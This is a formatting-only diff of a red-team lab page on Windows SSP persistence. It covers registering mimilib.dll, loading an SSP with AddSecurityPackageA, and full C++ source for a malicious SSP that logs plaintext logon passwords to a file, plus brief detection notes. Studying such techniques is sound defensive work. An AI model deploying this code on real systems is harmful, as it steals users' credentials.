@@ -8,7 +8,7 @@ This technique abuses Windows Security Support Provider \(SSP\) and Authenticati
 
 ## Loading SSP with Reboot
 
-In this lab, mimikatz Security Support Provider [mimilib.dll](https://github.com/gentilkiwi/mimikatz) will be registered as a Windows Security Package. 
+In this lab, mimikatz Security Support Provider [mimilib.dll](https://github.com/gentilkiwi/mimikatz) will be registered as a Windows Security Package.
 
 Once the Security Package is registered and the system is rebooted, the mimilib.dll will be loaded into lsass.exe process memory and intercept all logon passwords next time someone logs onto the system or otherwise authenticates, say, via `runas.exe`.
 
@@ -44,7 +44,7 @@ The below shows `Security Packages` registry value with the `mimilib` added and 
 ![](../../.gitbook/assets/lsa-security-packages.png)
 
 {% hint style="info" %}
-Reboot is required for the new SSP to take effect after it's been added to the Security Packages  list.
+Reboot is required for the new SSP to take effect after it's been added to the Security Packages list.
 {% endhint %}
 
 ## Loading SSP without Reboot
@@ -66,9 +66,9 @@ Below code loads the malicious SSP spotless.dll:
 
 int main()
 {
-	SECURITY_PACKAGE_OPTIONS spo = {};
-	SECURITY_STATUS ss = AddSecurityPackageA((LPSTR)"c:\\temp\\spotless.dll", &spo);
-	return 0;
+    SECURITY_PACKAGE_OPTIONS spo = {};
+    SECURITY_STATUS ss = AddSecurityPackageA((LPSTR)"c:\\temp\\spotless.dll", &spo);
+    return 0;
 }
 ```
 
@@ -82,7 +82,7 @@ Loading the SSP with this approach does not survive a reboot unlike SSPs that ar
 
 ## Detection
 
-It may be worth monitoring `Security Packages` value in`hklm\system\currentcontrolset\control\lsa\` for changes. 
+It may be worth monitoring `Security Packages` value in`hklm\system\currentcontrolset\control\lsa\` for changes.
 
 Newly added packages should be inspected:
 
@@ -112,59 +112,59 @@ NTSTATUS NTAPI SpShutDown(void) { return 0; }
 
 NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
 {
-	PackageInfo->Name = (SEC_WCHAR *)L"SSSPotless";
-	PackageInfo->Comment = (SEC_WCHAR *)L"SSSPotless <o>";
-	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
-	PackageInfo->wRPCID = SECPKG_ID_NONE;
-	PackageInfo->cbMaxToken = 0;
-	PackageInfo->wVersion = 1;
-	return 0;
+    PackageInfo->Name = (SEC_WCHAR *)L"SSSPotless";
+    PackageInfo->Comment = (SEC_WCHAR *)L"SSSPotless <o>";
+    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
+    PackageInfo->wRPCID = SECPKG_ID_NONE;
+    PackageInfo->cbMaxToken = 0;
+    PackageInfo->wVersion = 1;
+    return 0;
 }
 
 NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
 {
-	HANDLE outFile = CreateFile(L"c:\\temp\\logged-pw.txt", FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	DWORD bytesWritten = 0;
-	
-	std::wstring log = L"";
-	std::wstring account = AccountName->Buffer;
-	std::wstring domain = PrimaryCredentials->DomainName.Buffer;
-	std::wstring password = PrimaryCredentials->Password.Buffer;
+    HANDLE outFile = CreateFile(L"c:\\temp\\logged-pw.txt", FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD bytesWritten = 0;
 
-	log.append(account).append(L"@").append(domain).append(L":").append(password).append(L"\n");
-	WriteFile(outFile, log.c_str(), log.length() * 2, &bytesWritten, NULL);
-	CloseHandle(outFile);
-	return 0;
+    std::wstring log = L"";
+    std::wstring account = AccountName->Buffer;
+    std::wstring domain = PrimaryCredentials->DomainName.Buffer;
+    std::wstring password = PrimaryCredentials->Password.Buffer;
+
+    log.append(account).append(L"@").append(domain).append(L":").append(password).append(L"\n");
+    WriteFile(outFile, log.c_str(), log.length() * 2, &bytesWritten, NULL);
+    CloseHandle(outFile);
+    return 0;
 }
 
 SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = 
 {
-	{
-		NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,	SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL 
-	}
+    {
+        NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,    SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL 
+    }
 };
 
 // SpLsaModeInitialize is called by LSA for each registered Security Package
 extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
 {
-	*PackageVersion = SECPKG_INTERFACE_VERSION;
-	*ppTables = SecurityPackageFunctionTable;
-	*pcTables = 1;
-	return 0;
+    *PackageVersion = SECPKG_INTERFACE_VERSION;
+    *ppTables = SecurityPackageFunctionTable;
+    *pcTables = 1;
+    return 0;
 }
 ```
 
 ## References
 
-{% embed url="https://github.com/gentilkiwi/mimikatz" %}
+{% embed url="https://github.com/gentilkiwi/mimikatz" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-mode-initialization" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-mode-initialization" caption="" %}
 
-{% embed url="https://github.com/veramine/Detections/wiki/LSA-Packages" %}
+{% embed url="https://github.com/veramine/Detections/wiki/LSA-Packages" caption="" %}
 
-{% embed url="https://adsecurity.org/?p=1760" %}
+{% embed url="https://adsecurity.org/?p=1760" caption="" %}
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1131" %}
+{% embed url="https://attack.mitre.org/wiki/Technique/T1131" caption="" %}
 
-{% embed url="https://blog.xpnsec.com/exploring-mimikatz-part-2/" %}
+{% embed url="https://blog.xpnsec.com/exploring-mimikatz-part-2/" caption="" %}
 
